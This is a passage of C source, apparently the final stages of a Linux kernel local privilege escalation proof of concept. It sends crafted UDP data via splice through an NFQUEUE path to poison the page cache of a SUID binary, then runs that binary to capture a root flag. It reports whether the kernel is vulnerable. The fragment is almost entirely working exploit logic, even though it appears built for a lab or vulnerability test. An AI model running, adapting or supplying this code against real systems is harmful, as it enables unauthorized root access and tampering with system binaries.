    if (splice_send(udp, self_fd, 0, PAYLOAD, -1, 0, 0) < 0)
        fatal("selftest splice send");
    {
        char want_line[64];
        int inner = A.ct_len - 16; /* UDP payload the decrypt delivers */
        int ok = 0, t;
        snprintf(want_line, sizeof(want_line), "udp %d", inner);
        for (t = 0; t < 50 && !ok; t++) {
            if (lr_line(&lrr, line, sizeof(line), 200) == 0 &&
                strcmp(line, want_line) == 0)
                ok = 1;
        }
        if (lr_line(&lrh, line, sizeof(line), 5000) < 0)
            P("LPE-SELFTEST-WARN no queue message for selftest");
        P("LPE-SELFTEST inner_udp=%s (len=%d)", ok ? "received" : "MISSING",
          inner);
        if (!ok)
            fatal("selftest: rewrite/decrypt path did not deliver the inner UDP");
    }

    /* ---- 10. trigger: aim the 8 gate bytes at the chain ------------- */
    vec_fd = memfd_with(A.vector, VEC_LEN);
    if (vec_fd < 0)
        fatal("vector memfd");
    P("LPE-TRIGGER sent=%d target_spliced=%d vector_spliced=%d",
      PAYLOAD, TGT_BYTES, VEC_LEN);
    if (splice_send(udp, tfd, GATE_OFF, TGT_BYTES, vec_fd, 0, VEC_LEN) < 0)
        fatal("trigger splice send (target not splice-able? needs a real fs)");
    if (lr_line(&lrh, line, sizeof(line), 5000) < 0)
        fatal("trigger: no NFQUEUE message");

    /* poll the gate bytes through the page cache */
    {
        int t;
        for (t = 0; t < 150; t++) {
            if (pread(tfd, cur, 8, GATE_OFF) != 8)
                fatal("gate re-read");
            if (memcmp(cur, GATE_OPEN, 8) == 0) {
                diverged = 1;
                break;
            }
            usleep(20000);
        }
    }
    hexs(cur, 8, gate_hex);
    P("LPE-DIVERGED %s (bytes %s)", diverged ? "yes" : "no", gate_hex);

    if (sha256_file(TARGET_PATH, sha_after) == 0)
        P("LPE-SHA256-AFTER %s", sha_after);

    /* ---- 11. closure: run the SUID gate ------------------------------ */
    if (run_gate(gate_out, sizeof(gate_out)) < 0)
        P("LPE-EXEC spawn failed");
    else {
        gate_out[strcspn(gate_out, "\n")] = 0;
        P("LPE-EXEC %s", gate_out);
    }
    captured = strstr(gate_out, "SECRETGATE-ROOT-OK") != NULL;

    /* ---- 12. disk-view evidence (in-guest; run.sh does block-level) -- */
    if (diverged) {
        if (posix_fadvise(tfd, 0, 0, POSIX_FADV_DONTNEED) == 0 &&
            pread(tfd, cur, 8, GATE_OFF) == 8) {
            hexs(cur, 8, gate_hex);
            P("LPE-DISK fadvise=DONTNEED bytes-after-evict=%s "
              "(page-cache poison survives eviction on this kernel)",
              gate_hex);
        }
    }

    kill(helper, SIGKILL);
    kill(rcvr, SIGKILL);
    waitpid(helper, NULL, 0);
    waitpid(rcvr, NULL, 0);

    /* ---- 13. verdict ------------------------------------------------ */
    if (captured && diverged) {
        char *flag = strstr(gate_out, "flag=");
        if (flag)
            flag += 5;
        P("LPE-RESULT: ROOT-FLAG-CAPTURED %s",
          flag ? flag : "(see LPE-EXEC above)");
        return 0;
    }
    if (!diverged) {
        P("LPE-RESULT: NOT-VULNERABLE (no page-cache divergence — "
          "skb_zerocopy() propagated SKBFL_SHARED_FRAG)");
        return 1;
    }
    P("LPE-RESULT: FAILED (page cache diverged but the gate did not open)");
    return 2;
}
